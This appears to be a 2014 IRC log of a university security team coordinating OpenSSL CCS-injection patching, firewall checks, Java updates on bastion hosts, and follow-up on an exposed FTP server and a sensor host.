2014-06-04 14:18:06	wraquel	On the bright side, this is the best abs workout I've had in weeks.
2014-06-04 14:18:08	soehlert	can you keep it down with that? i cant even hear myself think
2014-06-04 14:18:37	wraquel	I'll add a muffler.
2014-06-04 14:18:51	soehlert	or silencer whatever works for you
2014-06-04 14:19:25	wraquel	pop a cap
2014-06-04 14:31:17	soehlert	jazoff: still want multiple files for vetting output or just go back to one big file?
2014-06-04 14:31:28	jazoff	welll
2014-06-04 14:31:34	jazoff	what's the current plan?
2014-06-04 14:31:43	soehlert	haha i have no idea anymore
2014-06-04 14:31:59	jazoff	well, if we want to just store it in git
2014-06-04 14:32:10	jazoff	using one file per value still makes updates easy
2014-06-04 14:32:20	jazoff	very easy to see what changed (iptables, suids, etc)
2014-06-04 14:33:20	soehlert	ya know what why dont i get this moin stuff figured out. then we can see how easy it would be to input into a wiki
2014-06-04 14:33:20	soehlert	if its worse we can look at the git strategy
2014-06-04 14:38:39	jazoff	http://moinmo.in/WikiRpc
2014-06-04 14:39:45	jazoff	git would probably be easier :)
2014-06-04 14:40:00	jazoff	too bad moinmoin does not use git for the backend like ikiwiki
2014-06-04 14:40:04	soehlert	hmm my concern is that wardog wouldnt like that setup
2014-06-04 14:40:08	soehlert	ikiwiki?
2014-06-04 14:40:32	soehlert	should i rethink the moin thing and look at ikiwiki?
2014-06-04 14:41:04	jazoff	depends who the audience is I suppose
2014-06-04 14:41:19	jazoff	ikiwiki is kinda weird, but it's just git
2014-06-04 14:42:15	soehlert	ya probably not then. i think we wanted all our wikis the same so security xsede and gird-sec
2014-06-04 15:09:48	--	wraquel is now known as wardog
2014-06-04 15:09:49	wardog	waht about me?
2014-06-04 15:10:10	soehlert	just trying to tailor this vetting output so its easy for you to use
2014-06-04 15:10:55	wardog	As long as there's a parseable output format I'll be fine.
2014-06-04 15:11:17	soehlert	so we may end up putting them in git 
2014-06-04 15:11:25	soehlert	so you'd just have to git pull for new ones.
2014-06-04 15:11:42	soehlert	then you'd have access to things like git diff and git history
2014-06-04 15:12:00	wardog	Git, with the history, sounds perfect.
2014-06-04 15:12:19	wardog	as long as the stored format is parseable that'll be ideal.
2014-06-04 15:12:37	wardog	You know, we should probably move IP address asssignments into git
2014-06-04 15:12:39	soehlert	well its bash so i can pretty much print it out however you'd like
2014-06-04 15:12:57	soehlert	you mean like the 141.142.148.0/25 space usage page on the wiki?
2014-06-04 15:13:05	wardog	yes
2014-06-04 15:13:17	soehlert	i like that idea.
2014-06-04 15:13:29	wardog	the wiki format is just too... cumberson.
2014-06-04 15:13:30	wardog	m
2014-06-04 15:13:38	soehlert	agreed
2014-06-04 15:14:20	soehlert	well im off to lucnh and then happy hour. i'm gonna check on the announcement at 7, if you hear anything before that lemme know 
2014-06-04 15:14:32	wardog	roger
2014-06-04 17:11:26	jazoff	https://twitter.com/frbytr/status/474310472192507904
2014-06-04 17:14:30	jazoff	which is http://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=c7f267397e9f1f8b43ddc84c4268bccc27d52b04
2014-06-04 17:14:54	jazoff	this one looks fun too http://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=53a224bb0ab6c7d0d509141638f7820b859d0ade
2014-06-04 18:16:02	jazoff	http://www.digitaltrends.com/mobile/cupid-the-new-heartbleed-attack-method-that-affects-android-devices/
2014-06-04 18:31:21	wardog	I saw those.
2014-06-04 18:31:38	wardog	Following twitter too huh...
2014-06-04 18:31:49	wardog	I wonder if this has anything to do with Cupid
2014-06-04 18:31:59	wardog	I'm guessing something new
2014-06-05 07:12:09	jazoff	so, https://www.openssl.org/news/secadv_20140605.txt
2014-06-05 07:22:17	jazoff	https://rhn.redhat.com/errata/RHSA-2014-0625.html
2014-06-05 07:46:00	jazoff	so.. " as bad as "goto fail", but not as bad as "heartbleed""
2014-06-05 07:48:07	jazoff	(mostly from here https://news.ycombinator.com/item?id=7851357 )
2014-06-05 08:11:52	wardog	Yeah, not horrible.
2014-06-05 08:14:57	jazoff	though I'm not sure if it is as bad as goto fail
2014-06-05 08:18:45	jazoff	ah, I suppose you could do the same dns spooofing and mitm the real site
2014-06-05 08:19:06	jazoff	so a little harder than goto fail, but still probably trivial
2014-06-05 08:19:41	jazoff	ah.. 'Since most(1) web browsers do not use OpenSSL, CVE-2014-0224 is not going to be a big concern for people browsing using SSL'
2014-06-05 08:19:45	jazoff	if that's true, then really not so bad
2014-06-05 08:50:58	wardog	Can someone look over https://wiki.ncsa.illinois.edu/pages/viewpage.action?pageId=33001060
2014-06-05 08:51:09	wardog	It's the blog post for the openssl thing
2014-06-05 08:55:48	wardog	BW training is a fun time for SSHD_POLICY::SSHD_SuspicousThreshold alerts....
2014-06-05 09:00:35	jazoff	hmm
2014-06-05 09:00:40	jazoff	where do those get sent to?
2014-06-05 09:00:41	jazoff	i don't ge them
2014-06-05 09:02:33	wardog	security-alerts@ncsa.uiuc.edu
2014-06-05 09:02:44	wardog	from bro@derecho.ncsa.illinois.edu
2014-06-05 09:09:46	jazoff	i dont think I get those
2014-06-05 09:26:32	wardog	well crap.
2014-06-05 09:26:36	wardog	That list is oooold
2014-06-05 09:46:07	soehlert	wardog: how do you want me to handle the bastions? update them both today? update one this morning and give it some time then do the other this afternoon? do one today one tomorrow?
2014-06-05 09:46:26	jazoff	what uses openssl on the bastians?
2014-06-05 09:46:44	soehlert	i suppose its just ssh which this doesn't really hit right?
2014-06-05 09:47:48	jazoff	not that I've seen
2014-06-05 09:48:19	soehlert	ok i was just going off adam's email about warren's blog post. it suggested patching anything with ssh, https, and GO asap
2014-06-05 09:54:15	wardog	Patch one today, one tomorrow.
2014-06-05 09:54:31	wardog	Since I don't think there's any SSL service, I don't think there's a hurry
2014-06-05 09:54:54	soehlert	ok so update all our stuff and then just the backups for the user facing machines?
2014-06-05 09:58:44	soehlert	wardog: also, barlow apparently is still owner of that list. he just saw jazoff get added and you remove yourself then add back
2014-06-05 10:02:55	jazoff	puppet uses ssl, but that is firewalled off right?
2014-06-05 10:03:45	soehlert	ACCEPT     tcp  --  141.142.148.0/25     0.0.0.0/0           state NEW tcp dpt:61613
2014-06-05 10:03:45	soehlert	ACCEPT     tcp  --  141.142.236.0/25     0.0.0.0/0           state NEW tcp dpt:61613
2014-06-05 10:03:45	soehlert	ACCEPT     tcp  --  141.142.149.0/27     0.0.0.0/0           state NEW tcp dpt:61613
2014-06-05 10:03:45	soehlert	ACCEPT     tcp  --  10.142.148.0/24      0.0.0.0/0           state NEW tcp dpt:61613
2014-06-05 10:03:45	soehlert	ACCEPT     tcp  --  10.142.155.0/25      0.0.0.0/0           state NEW tcp dpt:61613
2014-06-05 10:03:45	soehlert	ACCEPT     tcp  --  10.142.156.0/25      0.0.0.0/0           state NEW tcp dpt:61613
2014-06-05 10:04:24	soehlert	so we should be good there
2014-06-05 10:06:32	jazoff	i thought it was 6349 or something like that
2014-06-05 10:06:49	jazoff	maybe not
2014-06-05 10:07:23	jazoff	ah, 8140
2014-06-05 10:07:31	soehlert	nope 61613 and 8140 (which has the same rules) then obviously 443 for the WUI
2014-06-05 10:07:41	jazoff	good to go then :)
2014-06-05 10:08:01	jazoff	ok then.. https://www.suse.com/support/update/ seems to be broken now and doesnt list anything anymore
2014-06-05 10:08:03	soehlert	61613 is orchestration and 8140 is "for puppet"
2014-06-05 10:10:52	jazoff	yep, and puppet protocol is just HTTPS
2014-06-05 10:11:22	soehlert	ah ok. i wasnt quite sure of what "for puppet" meant
2014-06-05 10:13:10	jazoff	it's what the agent connects to
2014-06-05 10:13:47	jazoff	sudo tail  -f /var/log/pe-httpd/puppetmaster.access.log
2014-06-05 10:13:48	jazoff	on squall
2014-06-05 10:14:00	wardog	jazoff: added you to the mailing ist.
2014-06-05 10:14:10	wardog	yes
2014-06-05 10:14:19	wardog	I own it now. Had to remove rafael too.
2014-06-05 10:14:26	jazoff	yep, i saw, got a few notices right away
2014-06-05 10:19:21	wardog	Assuming you'll be around for BroCon are you scheduled to come into Champaign between now and then?
2014-06-05 10:19:30	jazoff	oh, not currently
2014-06-05 10:19:39	wardog	When were you hear last?
2014-06-05 10:19:40	wardog	here
2014-06-05 10:19:42	jazoff	since when is it june already
2014-06-05 10:19:44	jazoff	ummm
2014-06-05 10:20:07	jazoff	middle of april
2014-06-05 10:20:27	wardog	Can you hop down in the next few weeks?
2014-06-05 10:20:39	jazoff	lemme check flights/hotel stuff
2014-06-05 10:20:52	wardog	don't forget to ask for the state rate
2014-06-05 10:21:06	jazoff	yeah, definitely did not do that the last times
2014-06-05 10:21:53	jazoff	wonder if it would make more sense to just stay for 2 weeks in august
2014-06-05 10:26:25	jazoff	flights/hotel seems a bit high
2014-06-05 10:26:45	wardog	hrm.
2014-06-05 10:27:27	wardog	Not sure if 2 weeks in a row is all that necessary.
2014-06-05 10:27:38	soehlert	oooo warm/cool/tepid openssl...shiiiiiit
2014-06-05 10:27:48	jazoff	well, won't get much done during the bro workshop...
2014-06-05 10:29:17	soehlert	wardog: what do you wanna do about warm/cool/tepid? terry and basney don't appear to be here and openssl rebuilds usually require a ton of terry work
2014-06-05 10:29:35	wardog	Hmmm
2014-06-05 10:29:46	wardog	How long is Terry out?
2014-06-05 10:29:56	soehlert	no idea. i didnt know he was out, but i dont see him
2014-06-05 10:30:41	soehlert	oh wait. out the rest of the week../
2014-06-05 10:30:50	wardog	Basney is aware of the issue.
2014-06-05 10:31:01	soehlert	and?
2014-06-05 10:31:07	wardog	Does he rebuild them or do you?
2014-06-05 10:31:16	jazoff	wardog: well, i'll look into it tonight with the GF
2014-06-05 10:31:17	soehlert	terry rebuilds
2014-06-05 10:31:17	soehlert	i have no idea how to do it
2014-06-05 10:31:29	jazoff	just need to make sure nothing is going on jun 15-21 or so
2014-06-05 10:31:34	soehlert	i know how to check if its broken and thats about it
2014-06-05 10:31:51	jazoff	sounds like something that should be automated :)
2014-06-05 10:32:04	soehlert	jazoff: its something ive been told cant be
2014-06-05 10:32:11	soehlert	its a lot of trying and failing
2014-06-05 10:32:18	wardog	Shit.
2014-06-05 10:32:21	jazoff	that seems.. odd
2014-06-05 10:32:42	soehlert	ya i dont understand. i think its because they have to build against a strange version of openssl or something and myproxy doesnt always play nice
2014-06-05 10:32:44	wardog	Well, find out what version is running and email Basney, Fleury and CC me to see how they want to proceed.
2014-06-05 10:32:52	soehlert	ok
2014-06-05 10:33:30	soehlert	and this is why i hate running machines that other people are on...
2014-06-05 10:35:01	jazoff	well, at least all the hosts still vulnerable to heartbleed are still blocked
2014-06-05 11:02:36	soehlert	wardog: so it seems like basney was pushing for me to do this in the future. im not sure i like this, "sam does services when it's convenient thing" can we put our foot down one way or the other. either we run the services (via puppet) or they do and I never touch them?
2014-06-05 11:03:23	jazoff	there's also a middle ground of sorts...
2014-06-05 11:03:28	soehlert	?
2014-06-05 11:03:29	jazoff	they provide us rpms and we do the rest
2014-06-05 11:03:53	jazoff	so they can do the bulds and whatever and we just install the packages they hand over
2014-06-05 11:04:00	soehlert	that would be fine too if they wanna bulid them 
2014-06-05 11:04:00	soehlert	actually i prefer that. but i cant stand this not knowing what is expected and whats not
2014-06-05 11:07:23	wardog	Alright, we'll work on the clarification
2014-06-05 11:07:31	soehlert	wardog: fwiw, your repoquery does not work on rhel5
2014-06-05 11:07:56	soehlert	repoquery command..
2014-06-05 11:09:03	wardog	Really?
2014-06-05 11:09:11	soehlert	--installed doesn't exist
2014-06-05 11:09:14	wardog	That's ok. RHEL5 is not supported. ;)
2014-06-05 11:09:19	soehlert	fair point
2014-06-05 11:10:02	jazoff	oh, i think there is a different command that works
2014-06-05 11:10:19	soehlert	well rhel5 machines can't be updated anyways
2014-06-05 11:10:36	soehlert	so even if they are out of date we're kinda outta luck
2014-06-05 11:10:45	soehlert	well i guess we can build the rpms by hand and all that..
2014-06-05 11:11:12	jazoff	rpm -qR  libssl...
2014-06-05 11:11:15	jazoff	or watever the name of the package is
2014-06-05 11:11:25	wardog	what is it on debian systems?
2014-06-05 11:11:30	wardog	is it openssl or libssl?
2014-06-05 11:11:49	soehlert	true
2014-06-05 11:12:03	soehlert	its openssl in redhat so i can only assume its libssl because they never line up right..
2014-06-05 11:12:57	jazoff	yeah, libssl on debian
2014-06-05 11:13:57	soehlert	this seems strange. all our hosts already are on the version of openssl we need. wasnt this patch just pushed out today? or was i just assuming..
2014-06-05 11:14:43	jazoff	does yum history show any changes?
2014-06-05 11:14:50	wardog	1.0.1e-16.el6_5.14?
2014-06-05 11:15:15	wardog	For some reason the patch is not in the yum repos yet.
2014-06-05 11:15:18	soehlert	oh wait. no ours are all on 1.0.1e-16.el6_5.7...but there's no .14 in the repo
2014-06-05 11:15:36	wardog	Yeah, for some reason the rpm is not in the yum repos.
2014-06-05 11:15:43	soehlert	so what should i do?
2014-06-05 11:16:03	soehlert	hold off until it's up? and build by hand if we have anything that needs it now (which i think is nothing)?
2014-06-05 11:16:28	jazoff	does yum makecache change anything?
2014-06-05 11:18:28	soehlert	nope
2014-06-05 11:18:28	soehlert	neither does yum clean all
2014-06-05 11:22:12	wardog	What's the link for cites' rhn server?
2014-06-05 11:23:04	jazoff	cosmos?
2014-06-05 11:23:18	jazoff	http://cosmos.cites.illinois.edu/
2014-06-05 11:23:23	wardog	is it me or is it not responsive?
2014-06-05 11:23:29	wardog	cosmos is the OS repo
2014-06-05 11:23:34	wardog	OSS repor
2014-06-05 11:23:43	wardog	rhn.cites.illinois.edu
2014-06-05 11:23:44	jazoff	oh, derr, the rhn server..
2014-06-05 11:23:45	jazoff	yeah
2014-06-05 11:23:46	wardog	It's not responding.
2014-06-05 11:24:08	soehlert	rhn is responding to pings..
2014-06-05 11:24:17	soehlert	rhn.cites.illinois.edu that is
2014-06-05 11:24:32	wardog	Maybe it's my connection
2014-06-05 11:24:44	soehlert	its actually fez.cites.illinois.edu
2014-06-05 11:24:49	soehlert	if that helps
2014-06-05 11:25:00	wardog	sudo su -
2014-06-05 11:25:03	wardog	w00t
2014-06-05 11:25:33	soehlert	what are you looking for?
2014-06-05 11:26:14	wardog	Parga found the RPM.
2014-06-05 11:26:21	wardog	Not that it helps much.
2014-06-05 11:26:26	soehlert	why not?
2014-06-05 11:26:40	soehlert	cant we just throw it in our repo and use it from there?
2014-06-05 11:26:47	wardog	That's doable.
2014-06-05 11:27:45	soehlert	where can i find it?
2014-06-05 11:28:06	wardog	I dunno. I was trying to drill down but wanted to look through rhn first.
2014-06-05 11:29:04	soehlert	ok. in other news. terry built what we need and i can replace it on warm and cool, but do i wanna hold off or is that one a do it now thing?
2014-06-05 11:30:38	jazoff	still nothing for ssl on suse.com
2014-06-05 11:31:19	wardog	It'll require a restart of all ssl related services. You should coordinate that with Basney to see if there's a preferredtime.
2014-06-05 11:31:27	wardog	Gotta love suse.
2014-06-05 11:35:06	soehlert	ugh need updated deps for that openssl package
2014-06-05 11:43:10	wardog	sigh
2014-06-05 11:44:34	soehlert	you want me to try and build them all or just wait for .14 to hit the repos?
2014-06-05 11:46:13	jazoff	time for a quick walk
2014-06-05 11:46:44	jazoff	then mess with suricata some more.. not much of use has been detected, but it seems to not need much resources, so why not
2014-06-05 11:46:51	jazoff	just need to figure out the log situation
2014-06-05 12:10:31	soehlert	wardog: did you see jim glasgow's email?
2014-06-05 12:19:38	wardog	I did
2014-06-05 12:19:48	wardog	That... doesn't make sense.
2014-06-05 12:20:06	wardog	Is the HPSS client installed on the bastions?
2014-06-05 12:22:11	soehlert	yes it is
2014-06-05 12:22:40	wardog	ah
2014-06-05 12:22:42	soehlert	i dont know how i feel about doing that update though.
2014-06-05 12:22:57	wardog	what's currently on there?
2014-06-05 12:23:01	soehlert	especially on the bastions.
2014-06-05 12:23:03	wardog	There is a critical update for java.
2014-06-05 12:23:10	wardog	Oh, where wasn't java before...
2014-06-05 12:23:11	soehlert	java-1.6.0-openjdk-1.6.0.0-5.1.13.3.el6_5.x86_64
2014-06-05 12:23:22	wardog	So there IS java.
2014-06-05 12:23:38	soehlert	ya
2014-06-05 12:23:40	wardog	Why does the HPSS client need to be on the bastion hosts?
2014-06-05 12:23:55	soehlert	just not 1.7.0
2014-06-05 12:23:55	soehlert	i cant remember. this was mostly a talk between adam and then and then i just made it happen
2014-06-05 12:23:58	wardog	Seems like it should be on an internal host built for that purpose.
2014-06-05 12:24:06	wardog	Using the bastion to get to it.
2014-06-05 12:24:07	soehlert	i think it was to avoid having it in a bunch of places
2014-06-05 12:24:17	soehlert	but thats a great idea i dont think came up
2014-06-05 12:24:54	wardog	Well.. I'm not comfortable with it either, but I'm ok for short term if we can work out transitioning it off the bastions.
2014-06-05 12:25:04	wardog	I don't know having the bastions as multi-purpose.
2014-06-05 12:25:23	soehlert	i totally agree with you long term i want them to only do ssh
2014-06-05 12:25:34	soehlert	in the short term though, what should i tell jim about updating that?
2014-06-05 12:26:20	wardog	We'll do it but we'll need to transition it off the bastions soon. I'll add it to the BW security meeting agenda.
2014-06-05 12:26:49	soehlert	seems like that needs CC no?
2014-06-05 12:27:09	wardog	To upgrade java?
2014-06-05 12:27:27	soehlert	i guess not acutally since normal updates dont'
2014-06-05 12:27:43	wardog	Unless there's a concern about going from java 6 to java 7.
2014-06-05 12:27:54	soehlert	i dont know how crashplan will react
2014-06-05 12:28:39	wardog	So, best way to test taht?
2014-06-05 12:28:54	soehlert	do it on a test host i guess..
2014-06-05 12:29:54	wardog	Is java 7 an update or a different package from 6?
2014-06-05 12:30:21	soehlert	not sure. not in the repos though
2014-06-05 12:31:16	soehlert	which gives me more pause
2014-06-05 12:31:32	wardog	Well, in that case I would say something along the lines of, 'Java 7 is currently untested and we have at least one important service using Java 6. Without proper testing we may not be able to update Java to 7 (1.7 whatever) within that timeframe"
2014-06-05 12:32:00	soehlert	call me a wuss but im most comfortable with that response. especially with this being the bastions
2014-06-05 12:32:12	wardog	Would it be hard to spin up a system who's sole goal is to support the HPSS client?
2014-06-05 12:32:29	soehlert	i ahve no idea. i just gave them a directory and they did all the HPSS stuff
2014-06-05 12:32:38	soehlert	so i guess not if thats the same case
2014-06-05 12:32:46	wardog	Oh, so they don't need root
2014-06-05 12:32:52	soehlert	no
2014-06-05 12:32:58	wardog	They could install java locally.
2014-06-05 12:32:59	soehlert	then again idk why we'd run it
2014-06-05 12:33:04	soehlert	or that..
2014-06-05 12:33:25	wardog	for all we know all they need is the jre.
2014-06-05 12:33:37	wardog	And they can run that locally just as easily.
2014-06-05 12:34:04	soehlert	so should i use what you said before and add the question of whether or not they can just run it locally?
2014-06-05 12:34:14	wardog	sure
2014-06-05 12:34:51	soehlert	ok and you never responded: want me to build the deps for openssl or wait for the repos to get it?
2014-06-05 12:35:04	wardog	oh, I didn't?....
2014-06-05 12:35:09	wardog	hrm.... wait for now.
2014-06-05 12:35:15	soehlert	ok got it
2014-06-05 12:35:50	jazoff	java is easily installed into a dir
2014-06-05 12:35:53	wardog	I just realized we use campus' satellite server. It need to update.
2014-06-05 12:35:59	jazoff	most software just looks for JAVA_HOME
2014-06-05 12:36:02	soehlert	ahhh right
2014-06-05 12:36:11	soehlert	jazoff: i think this is an in house perl script
2014-06-05 12:36:13	jazoff	i have the latest hava in $HOME on my thinkpad
2014-06-05 12:36:22	soehlert	i wouldnt assume anything is properly done with it
2014-06-05 12:36:43	jazoff	well as long as 'java' is in the path and JAVA_HOME is set anything should work
2014-06-05 12:37:17	soehlert	fair enough. i'll give them the option and then it's just on them
2014-06-05 12:37:33	soehlert	wardog: security doens't run the satellite server do they?
2014-06-05 12:41:27	wardog	o
2014-06-05 12:41:28	wardog	No
2014-06-05 12:41:33	wardog	CITES, Seth specifically.
2014-06-05 12:41:36	wardog	Just pinged them.
2014-06-05 12:41:47	soehlert	ok cool i was just gonna ask if you knew the guy so you could od that
2014-06-05 12:41:47	wardog	They updated. Should be ready in a few minutes.
2014-06-05 12:44:16	wardog	Misunderstood the reponse from the guys I was talking to. They haven't updated satellite server yet.
2014-06-05 12:44:23	wardog	Trying to find out when they will.
2014-06-05 12:44:26	soehlert	oh...fun
2014-06-05 12:46:13	wardog	Apparently it'll update later tonight
2014-06-05 12:46:33	soehlert	oh ok
2014-06-05 12:57:22	jazoff	eyrich: any idea why subzero isn't seeing any traffic?
2014-06-05 12:57:37	soehlert	eyrich: is gone for the rest of the week
2014-06-05 12:57:43	jazoff	ah
2014-06-05 12:57:49	jazoff	will check on it after lunch
2014-06-05 12:57:49	jazoff	brb
2014-06-05 13:23:03	jazoff	grr, apparently trying to ifdown/ifup the capture interface on subzero broke it
2014-06-05 13:23:12	soehlert	jazoff: think you broke subzero
2014-06-05 13:23:16	soehlert	hah yes that
2014-06-05 13:23:33	jazoff	that makes little sense, unless the interface config for that is nto quite right
2014-06-05 13:23:49	jazoff	it's just setup for 10.0.1.1, shouldn't matter
2014-06-05 13:23:52	soehlert	i wouldnt think so but something clearly happened.
2014-06-05 13:24:02	soehlert	you sure you downed the right one?
2014-06-05 13:24:05	jazoff	yeah
2014-06-05 13:24:14	jazoff	yeah... the down was actually ok
2014-06-05 13:24:17	jazoff	the ifup eth0 is what broe it
2014-06-05 13:24:38	soehlert	ok. weird
2014-06-05 13:24:49	jazoff	granted, it was acting upbefore I touched it :)
2014-06-05 13:24:57	soehlert	mmhmm
2014-06-05 13:25:01	jazoff	showing 0 traffic when it should have been showing like 2gig/s
2014-06-05 13:27:29	soehlert	so i would suppose you want someone to go kick it over at npcf eh?
2014-06-05 13:27:46	jazoff	no rush really
2014-06-05 13:28:59	wardog	So there's a CCS detector from RHEL. The page is slow though. https://access.redhat.com/labs/ccsinjectiontest/
2014-06-05 13:30:44	jazoff	i'm sure we'll see a standalone tool too
2014-06-05 13:33:50	wardog	They have a perl one you can download.
2014-06-05 13:34:00	wardog	Want to re-write it in python?
2014-06-05 13:36:00	wardog	Can you guys track down the owner of that FTP server?
2014-06-05 13:36:19	soehlert	adam said he already told that group to work on moving it to a secure place
2014-06-05 13:36:27	soehlert	i just BHR'd in the meantime per adam's orders
2014-06-05 13:36:47	wardog	Ok, well, for DLP can someone collect logs for access to that?
2014-06-05 13:37:28	soehlert	DLP?
2014-06-05 13:38:08	wardog	data loss prevention
2014-06-05 13:38:18	soehlert	ah
2014-06-05 13:38:24	soehlert	ya sure i'll try to track that down
2014-06-05 13:38:49	wardog	Just in time for my afternoon ab workout. a.k.a. coughing up a lung.
2014-06-05 13:42:02	jazoff	i think they fixed that ftp thing before you blocked it
2014-06-05 13:42:10	soehlert	doesnt sound like it
2014-06-05 13:42:34	soehlert	he's moving some files, but adam wanted to knowwho the actual person is first. which doug is still trakcing down
2014-06-05 13:42:35	jazoff	the last few log entries from bro are 'permission denied'
2014-06-05 13:43:04	soehlert	thats weird, that whole server was public access.
2014-06-05 13:43:22	jazoff	google grabbed a bunch of them last week
2014-06-05 13:43:38	wardog	well, fun.
2014-06-05 13:43:40	soehlert	oh did you already grab the logs for this?
2014-06-05 13:43:59	jazoff	source=*ftp* forms 141.142.192.162  | table _time id_orig_h id_resp_h  user password command arg reply_msg
2014-06-05 13:44:43	jazoff	ah, subzero came back
2014-06-05 13:44:45	jazoff	was rebooted
2014-06-05 13:44:50	jazoff	did it panic or something?
2014-06-05 13:45:02	jazoff	it's seeing traffic again
2014-06-05 13:45:03	soehlert	i didnt see one.
2014-06-05 13:45:06	jazoff	worsk for me
2014-06-05 13:45:28	soehlert	last messages entries: Jun  5 13:44:53 subzero kernel: device eth0 entered promiscuous mode
2014-06-05 13:45:28	soehlert	Jun  5 13:44:55 subzero kernel: device eth0 left promiscuous mode
2014-06-05 13:45:28	soehlert	Jun  5 13:44:56 subzero kernel: device eth0 entered promiscuous mode
2014-06-05 13:45:28	soehlert	Jun  5 13:45:11 subzero kernel: device eth0 left promiscuous mode
2014-06-05 13:45:51	soehlert	dmesg shows no panic either.
2014-06-05 13:46:28	jazoff	right before it rebooted it did log this:
2014-06-05 13:46:32	jazoff	Jun  5 13:19:40 subzero kernel: myri10ge: eth0 never got down irq
2014-06-05 13:46:44	jazoff	then Jun  5 13:22:05 subzero kernel: INFO: task java:25898 blocked for more than 120 seconds.
2014-06-05 13:46:46	soehlert	where you seeing that?
2014-06-05 13:46:46	soehlert	thats long before the reboot
2014-06-05 13:47:06	jazoff	no that was right before it
2014-06-05 13:47:11	jazoff	 13:47:07 up 14 min,  2 users,  load average: 0.12, 0.25, 0.23
2014-06-05 13:47:15	jazoff	reboot was at 13:33
2014-06-05 13:47:38	soehlert	right
2014-06-05 13:47:38	soehlert	i guess i was considering 10 minutes a long time here
2014-06-05 13:47:46	jazoff	ah
2014-06-05 13:47:48	soehlert	i thought you were suggesting it immediately rebooted after that
2014-06-05 13:47:52	jazoff	well that's the only thing there :)
2014-06-05 13:47:55	jazoff	i'm sure it was related
2014-06-05 13:48:01	soehlert	probably true
2014-06-05 13:53:52	soehlert	jazoff: having issues with bhr. cant unblock that ftp server
2014-06-05 13:54:42	jazoff	oh?
2014-06-05 13:54:51	soehlert	i was trying to unblock and it just didnt do anything
2014-06-05 13:54:56	wardog	ruh roh
2014-06-05 13:54:59	soehlert	at this script bhwebsimpleproc.pl
2014-06-05 13:55:14	soehlert	adam said he can get to it but it seems like its still listed on the block list
2014-06-05 13:55:36	jazoff	i can't get to it
2014-06-05 13:55:45	jazoff	lemme ssh in and see what happens
2014-06-05 13:55:46	wardog	run reconsile
2014-06-05 13:55:48	soehlert	ya i think its still blocked.
2014-06-05 13:55:48	soehlert	ok
2014-06-05 13:56:03	soehlert	wardog: i tried that too. it loads a new blank page and just sits there
2014-06-05 13:56:03	soehlert	same as the unblock
2014-06-05 13:57:48	jazoff	worked from the cli...
2014-06-05 13:58:01	soehlert	ok as long as its good for now we wont get yelled at :)
2014-06-05 13:59:08	jazoff	don't see anythign obvoius wrong in the code..
2014-06-05 13:59:15	jazoff	might be somethign in the http errro log but i can't view it
2014-06-05 13:59:34	soehlert	ok we may need to wait for icepick. as long as its unblocked i think we're ok
2014-06-05 13:59:56	jazoff	it's weird because the cli just does
2014-06-05 13:59:58	jazoff	        return $mgr->remove_block($ipaddress,$reason,$servicename);
2014-06-05 14:00:02	jazoff	and the cgi does
2014-06-05 14:00:04	jazoff	        $mgr->remove_block($ip, $reason, $user);
2014-06-05 14:00:29	jazoff	and the cli worked, so not sure what was wrong
2014-06-05 14:01:26	soehlert	ya thats weird. we probably need error log to get to the bottom of this
2014-06-05 14:01:26	jazoff	half the stuff on that ftp server is 20 years old
2014-06-05 14:01:38	jazoff	we can do some more testing
2014-06-05 14:01:50	soehlert	unsurprising
2014-06-05 14:01:50	soehlert	probably why nobody noticed this issue
2014-06-05 14:01:50	soehlert	nobody pays attentnion to i
2014-06-05 14:04:25	jazoff	ftp://ftp.ncsa.uiuc.edu/incoming/
2014-06-05 14:04:28	jazoff	interesting
2014-06-05 14:05:28	jazoff	lots of empty directories there
2014-06-05 14:07:41	jazoff	apparently some kind of webcam at pcf uses that ftp server
2014-06-05 14:08:07	jazoff	source=*ftp* 141.142.192.162 mimiller@ncsa.uiuc.edu | table _time id_orig_h id_resp_h  user password command arg reply_msg
2014-06-05 14:08:32	soehlert	?
2014-06-05 14:08:34	soehlert	weird..
2014-06-05 14:08:55	wardog	Parga says that campus satellite servers have openssl update now. Can you check?
2014-06-05 14:10:12	soehlert	yup its there aaaaannnnnddddd....
2014-06-05 14:10:18	soehlert	it istalls fine
2014-06-05 14:10:23	wardog	whee!
2014-06-05 14:10:32	soehlert	yayyy now the fun part...
2014-06-05 14:11:14	soehlert	holy hell. your repoquery command returns hundreds of things..
2014-06-05 14:11:44	wardog	just a few.
2014-06-05 14:16:49	soehlert	is there a way to do this sorta thing does anyone know? ldd every_running_service | grep package
2014-06-05 14:17:11	jazoff	debian does that for you somehow :)
2014-06-05 14:17:24	soehlert	im sure theres a way ive just never learnt it
2014-06-05 14:17:25	jazoff	i think it just uses dependancy info though
2014-06-05 14:17:45	wardog	I think I had the command on the wiki page.
2014-06-05 14:17:54	jazoff	does rpm -qR openssl help?
2014-06-05 14:18:05	soehlert	ya the one that returns like 10000s of packages and doesn't really look at running services
2014-06-05 14:18:18	jazoff	oh, you want the lsof command
2014-06-05 14:18:24	jazoff	we did that when the gnutls thing came out
2014-06-05 14:18:37	jazoff	lsof -n |grep libssl
2014-06-05 14:18:38	jazoff	try that
2014-06-05 14:18:59	soehlert	works better with openssl but that'll do :)
2014-06-05 14:19:08	soehlert	puppet is the only thing on analysis-sec
2014-06-05 14:19:15	soehlert	thats more like what i expected to see
2014-06-05 14:22:11	jazoff	soehlert: did your nexus 5 get the update yet?
2014-06-05 14:22:35	soehlert	what update? (so probably not)
2014-06-05 14:22:43	jazoff	android
2014-06-05 14:23:06	soehlert	hah literally just popped up
2014-06-05 14:28:46	soehlert	jazoff: weird question. how best to restart the puppet agents themselves
2014-06-05 14:29:56	jazoff	/etc/init.d/pe-puppet restart
2014-06-05 14:30:05	jazoff	or I suppose you could use the console to do it
2014-06-05 14:30:27	soehlert	ok didnt know if that would restart all the related pe-* stuff or not
2014-06-05 14:30:33	soehlert	and if not if there was a special order..
2014-06-05 14:30:42	jazoff	oh
2014-06-05 14:30:48	jazoff	i think you just need puppet on the nodes
2014-06-05 14:30:57	soehlert	ya i just realized that as i said that..
2014-06-05 14:58:40	soehlert	wardog: adam would like you to look at the kernel vulns that he linked earlier and just see if it affects us/find out if it's in the wild/recommend a course of action
2014-06-05 15:08:00	wardog	I did take a look. RHEL says 5 isn't affect and that patches will be available soon for 6. Still looking
2014-06-05 15:08:14	soehlert	ok cool that works then
2014-06-05 15:33:17	soehlert	alright gonna run to get ready for volleyball. afterwords ill be on updating openssl so if anyone needs anything drop a line
2014-06-06 01:54:50	--	irc: disconnected from server
